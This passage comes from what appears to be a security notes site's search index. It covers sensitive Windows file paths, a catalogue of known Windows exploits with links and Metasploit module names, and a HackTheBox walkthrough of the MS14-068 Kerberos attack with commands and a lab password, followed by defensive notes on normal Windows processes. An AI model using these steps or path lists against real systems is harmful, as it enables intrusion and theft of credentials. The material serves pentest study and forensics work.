conf / httpd . conf C : / Program Files / Apache Group / Apache / logs / access . log C : / Program Files / Apache Group / Apache / logs / error . log C : / Program Files / FileZilla Server / FileZilla Server . xml C : / Program Files / MySQL / data / hostname . err C : / Program Files / MySQL / data / mysql - bin . log C : / Program Files / MySQL / data / mysql . err C : / Program Files / MySQL / data / mysql . log C : / Program Files / MySQL / my . ini C : / Program Files / MySQL / my . cnf C : / Program Files / MySQL / MySQL Server 5.0 / data / hostname . err C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql - bin . log C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql . err C : / Program Files / MySQL / MySQL Server 5.0 / data / mysql . log C : / Program Files / MySQL / MySQL Server 5.0 / my . cnf C : / Program Files / MySQL / MySQL Server 5.0 / my . ini C : / Program Files ( x86 ) / Apache Group / Apache2 / conf / httpd . conf C : / Program Files ( x86 ) / Apache Group / Apache / conf / httpd . conf C : / Program Files ( x86 ) / Apache Group / Apache / conf / access . log C : / Program Files ( x86 ) / Apache Group / Apache / conf / error . log C : / Program Files ( x86 ) / FileZilla Server / FileZilla Server . xml C : / Program Files ( x86 ) / xampp / apache / conf / httpd . conf C : / WINDOWS / php . ini C : / WINDOWS / Repair / SAM C : / Windows / repair / system C : / Windows / repair / software C : / Windows / repair / security C : / WINDOWS / System32 / drivers / etc / hosts C : / Windows / win . ini C : / WINNT / php . ini C : / WINNT / win . ini C : / xampp / apache / bin / php . ini C : / xampp / apache / logs / access . log C : / xampp / apache / logs / error . log C : / Windows / Panther / Unattend / Unattended . xml C : / Windows / Panther / Unattended . xml C : / Windows / debug / NetSetup . log C : / Windows / system32 / config / AppEvent . Evt C : / Windows / system32 / config / SecEvent . Evt C : / Windows / system32 / config / default . sav C : / Windows / system32 / config / security . sav C : / Windows / system32 / config / software . sav C : / Windows / system32 / config / system . sav C : / Windows / system32 / config / regback / default C : / Windows / system32 / config / regback / sam C : / Windows / system32 / config / regback / security C : / Windows / system32 / config / regback / system C : / Windows / system32 / config / regback / software C : / Program Files / MySQL / MySQL Server 5.1 / my . ini C : / Windows / System32 / inetsrv / config / schema / ASPNET_schema . xml C : / Windows / System32 / inetsrv / config / applicationHost . config C : / inetpub / logs / LogFiles / W3SVC1 / u_ex [ YYMMDD ] . log","title":"Discovery"},{"location":"os/windows/important-files/#base64-encode-decode","text":"certutil - encode inputfile outputfile certutil - decode inputfile outputfile","title":"Base64 encode / decode"},{"location":"os/windows/important-issues/","text":"Remote Exploits IIS MS16-143 / CVE-2017-7269 - Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit / windows / iis / iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269 SMB MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit / windows / smb / ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/ Active Directory / Kerberos MS14-068 (PyKEK) KDC did not validate PAC checksum correctly Can rewrite ticket to be domain admin Internals - Request TGT with no PAC - Create a forged PAC signed with user's password hash - TGT is sent with forged PAC as the authenticator - KDS does validation - Request is for a Service Tickect with no PAC - Sees that TGT is with no PAC - Takes the forged PAC in the authenticator - Include that in a new TGT and use it for issueing Service Ticket - Request a deligation ticket to get it woking across DCs Detect by: - AS-REQ and TGS-REQ both containing \"Include PAC:false\" Fix: - Apply KB3011780 before DCPromo RPC MS03-026 - DCOM RPC Overflow Discovered by LSD Over Port - 135 Exploit: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 References: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/10-years-on-a-look-back-at-ms08-067/ MS05-017 Exploit: - https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/windows/remote/1075.c MS07-029 - Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP) MS07-065 Other (Local) MS17-013 - Microsoft Graphics Componen Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References: MS10-061 - Windows Printer Spooler (Stuxnet) XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem \\ Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md Privilege Escalation Exploits MS16-032 - Secondary Logon to Address Elevation of Privilege Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html MS11-080 - Ancillary Function Driver (AfdJoinLeaf) XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller . py --onefile example.py MS12-042 - Windows Kernel - SYSRET XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861 MS15-051 - Windows Kernel-Mode Drivers (client_copy_image) 2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit / windows / local / ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html MS10-092 - Task Scheduler Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit / windows / local / ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference 2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit / windows / local / ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference 2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit / windows / local / ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt bypassuac_eventvwr MS10-015 - Kitrap0d MS14-068 - Kerberos Domain Privilege Escalation Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek - The Mystery of Duqu 2.0: a sophisticated cyberespionage actor returns apt - get install krb5 - user cifs - utils rdate # Add proper nameservers in / etc / hosts / etc / krb5 . conf [ libdefaults ] default_realm = HTB . LOCAL # The following krb5 . conf variables are only for MIT Kerberos . kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true # Edit the realms entry as follows : [ realms ] LAB . LOCAL = { kdc = mantis . htb . local : 88 admin_server = mantis . htb . local default_domain = HTB . LOCAL } # Also edit the final section : [ domain_realm ] . domain . internal = HTB . LOCAL domain . internal = HTB . LOCAL net time - S 10 . 10 . 10 . 52 - U # Set local time accordingly # OR USE rdate - n 10 . 10 . 10 . 52 python ms14 - 068. py - u james @htb . local - d mantis . htb . local - p J @m3s_P@ssW0rd ! - s S - 1 - 5 - 21 - 4220043660 - 4019079961 - 2895681657 Rename the generated ticket to \u200b / tmp / krb5cc_0 \u200b mv TGT_James @HTB . local . ccache / tmp / krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - python goldenPac . py htb . local / james @mantis . htb . local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient - W HTB . LOCAL // MANTIS / c $ - k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation 10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020 MS11-013","title":"Important issues"},{"location":"os/windows/important-issues/#remote-exploits","text":"","title":"Remote Exploits"},{"location":"os/windows/important-issues/#iis","text":"","title":"IIS"},{"location":"os/windows/important-issues/#ms16-143-cve-2017-7269-","text":"Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit / windows / iis / iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269","title":"MS16-143 / CVE-2017-7269 -"},{"location":"os/windows/important-issues/#smb","text":"","title":"SMB"},{"location":"os/windows/important-issues/#ms17-010-eternalblue-smb-remote-windows-kernel-pool-corruption","text":"Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit / windows / smb / ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/","title":"MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption"},{"location":"os/windows/important-issues/#active-directory-kerberos","text":"","title":"Active Directory / Kerberos"},{"location":"os/windows/important-issues/#ms14-068-pykek","text":"KDC did not validate PAC checksum correctly Can rewrite ticket to be domain admin Internals - Request TGT with no PAC - Create a forged PAC signed with user's password hash - TGT is sent with forged PAC as the authenticator - KDS does validation - Request is for a Service Tickect with no PAC - Sees that TGT is with no PAC - Takes the forged PAC in the authenticator - Include that in a new TGT and use it for issueing Service Ticket - Request a deligation ticket to get it woking across DCs Detect by: - AS-REQ and TGS-REQ both containing \"Include PAC:false\" Fix: - Apply KB3011780 before DCPromo","title":"MS14-068 (PyKEK)"},{"location":"os/windows/important-issues/#rpc","text":"","title":"RPC"},{"location":"os/windows/important-issues/#ms03-026-dcom-rpc-overflow-discovered-by-lsd","text":"Over Port - 135 Exploit: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 References: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/10-years-on-a-look-back-at-ms08-067/","title":"MS03-026 - DCOM RPC Overflow Discovered by LSD"},{"location":"os/windows/important-issues/#ms05-017","text":"Exploit: - https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/windows/remote/1075.c","title":"MS05-017"},{"location":"os/windows/important-issues/#ms07-029-microsoft-dns-rpc-service-extractquotedchar-overflow-tcp","text":"","title":"MS07-029 - Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP)"},{"location":"os/windows/important-issues/#ms07-065","text":"","title":"MS07-065"},{"location":"os/windows/important-issues/#other-local","text":"","title":"Other (Local)"},{"location":"os/windows/important-issues/#ms17-013-microsoft-graphics-componen","text":"Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References:","title":"MS17-013 - Microsoft Graphics Componen"},{"location":"os/windows/important-issues/#ms10-061-windows-printer-spooler-stuxnet","text":"XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem \\ Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md","title":"MS10-061 - Windows Printer Spooler (Stuxnet)"},{"location":"os/windows/important-issues/#privilege-escalation-exploits","text":"","title":"Privilege Escalation Exploits"},{"location":"os/windows/important-issues/#ms16-032-secondary-logon-to-address-elevation-of-privilege","text":"Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html","title":"MS16-032 - Secondary Logon to Address Elevation of Privilege"},{"location":"os/windows/important-issues/#ms11-080-ancillary-function-driver-afdjoinleaf","text":"XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller . py --onefile example.py","title":"MS11-080 -  Ancillary Function Driver (AfdJoinLeaf)"},{"location":"os/windows/important-issues/#ms12-042-windows-kernel-sysret","text":"XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861","title":"MS12-042 - Windows Kernel - SYSRET"},{"location":"os/windows/important-issues/#ms15-051-windows-kernel-mode-drivers-client_copy_image","text":"2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit / windows / local / ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","title":"MS15-051 - Windows Kernel-Mode Drivers (client_copy_image)"},{"location":"os/windows/important-issues/#ms10-092-task-scheduler","text":"Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit / windows / local / ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf","title":"MS10-092 - Task Scheduler"},{"location":"os/windows/important-issues/#ms14-058-trackpopupmenu-win32k-null-pointer-dereference","text":"2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit / windows / local / ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html","title":"MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference"},{"location":"os/windows/important-issues/#ms14-070-tcpipsetaddroptions-null-pointer-dereference","text":"2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit / windows / local / ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt","title":"MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference"},{"location":"os/windows/important-issues/#bypassuac_eventvwr","text":"","title":"bypassuac_eventvwr"},{"location":"os/windows/important-issues/#ms10-015-kitrap0d","text":"","title":"MS10-015 - Kitrap0d"},{"location":"os/windows/important-issues/#ms14-068-kerberos-domain-privilege-escalation","text":"Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek - The Mystery of Duqu 2.0: a sophisticated cyberespionage actor returns apt - get install krb5 - user cifs - utils rdate # Add proper nameservers in / etc / hosts / etc / krb5 . conf [ libdefaults ] default_realm = HTB . LOCAL # The following krb5 . conf variables are only for MIT Kerberos . kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true # Edit the realms entry as follows : [ realms ] LAB . LOCAL = { kdc = mantis . htb . local : 88 admin_server = mantis . htb . local default_domain = HTB . LOCAL } # Also edit the final section : [ domain_realm ] . domain . internal = HTB . LOCAL domain . internal = HTB . LOCAL net time - S 10 . 10 . 10 . 52 - U # Set local time accordingly # OR USE rdate - n 10 . 10 . 10 . 52 python ms14 - 068. py - u james @htb . local - d mantis . htb . local - p J @m3s_P@ssW0rd ! - s S - 1 - 5 - 21 - 4220043660 - 4019079961 - 2895681657 Rename the generated ticket to \u200b / tmp / krb5cc_0 \u200b mv TGT_James @HTB . local . ccache / tmp / krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - python goldenPac . py htb . local / james @mantis . htb . local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient - W HTB . LOCAL // MANTIS / c $ - k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis","title":"MS14-068 - Kerberos Domain Privilege Escalation"},{"location":"os/windows/important-issues/#cve-2017-0213-com-aggregate-marshaleriremunknown2-type-confusion-privilege-escalation","text":"10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020","title":"CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation"},{"location":"os/windows/important-issues/#ms11-013","text":"","title":"MS11-013"},{"location":"os/windows/important-processes/","text":"Important Processes Idle and System Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running SMSS - Session Manager First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system. CSRSS.EXE - Client/Server Run Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0 WININIT.EXE - Windows Initialization Process Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0 SERVICES.EXE - Service Control Manager Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running LSASS.EXE - Local Security Authority Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes SVCHOST.EXE - Service Hosting Process Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0 LSM.EXE - Load Session Manager Service Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0 WINLOGON.EXE - Windows Logon Process No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process. Explorer.exe - AKA Windows Explorer No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here. Checklist Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc. References Ref: http://sysforensics.org/2014/01/know-your-windows-processes . Link is not longer working. Ref: https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf","title":"Important Processes"},{"location":"os/windows/important-processes/#important-processes","text":"","title":"Important Processes"},{"location":"os/windows/important-processes/#idle-and-system","text":"Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running","title":"Idle and System"},{"location":"os/windows/important-processes/#smss-session-manager","text":"First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system.","title":"SMSS - Session Manager"},{"location":"os/windows/important-processes/#csrssexe-clientserver-run","text":"Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0","title":"CSRSS.EXE - Client/Server Run"},{"location":"os/windows/important-processes/#wininitexe-windows-initialization-process","text":"Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0","title":"WININIT.EXE - Windows Initialization Process"},{"location":"os/windows/important-processes/#servicesexe-service-control-manager","text":"Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running","title":"SERVICES.EXE - Service Control Manager"},{"location":"os/windows/important-processes/#lsassexe-local-security-authority","text":"Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes","title":"LSASS.EXE - Local Security Authority"},{"location":"os/windows/important-processes/#svchostexe-service-hosting-process","text":"Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0","title":"SVCHOST.EXE - Service Hosting Process"},{"location":"os/windows/important-processes/#lsmexe-load-session-manager-service","text":"Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0","title":"LSM.EXE - Load Session Manager Service"},{"location":"os/windows/important-processes/#winlogonexe-windows-logon-process","text":"No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows 